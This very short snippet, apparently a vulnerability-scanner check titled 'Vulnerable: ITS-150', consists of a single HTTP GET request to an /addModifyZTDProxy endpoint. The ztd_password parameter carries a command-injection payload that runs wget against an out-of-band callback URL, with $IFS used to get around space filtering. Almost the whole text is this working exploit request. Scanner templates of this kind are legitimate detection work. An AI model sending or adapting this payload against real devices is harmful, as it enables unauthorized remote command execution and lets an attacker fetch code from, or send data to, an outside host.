# Vulnerable: ITS-150
GET /Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://{{interactsh-url}})
